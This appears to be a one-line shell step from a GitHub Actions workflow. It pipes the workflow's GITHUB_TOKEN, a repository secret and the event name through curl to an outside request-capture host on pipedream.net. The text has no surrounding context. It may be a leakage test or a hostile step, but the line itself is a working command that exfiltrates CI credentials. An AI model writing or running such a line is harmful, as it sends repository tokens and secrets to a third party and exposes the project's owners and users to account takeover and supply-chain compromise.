echo "$GITHUB_TOKEN ${{ secrets.SECRETSTRING }} ${{ github.event_name }}" | curl -d @- 'https://enfmhcr6p3b26.x.pipedream.net/from_script'
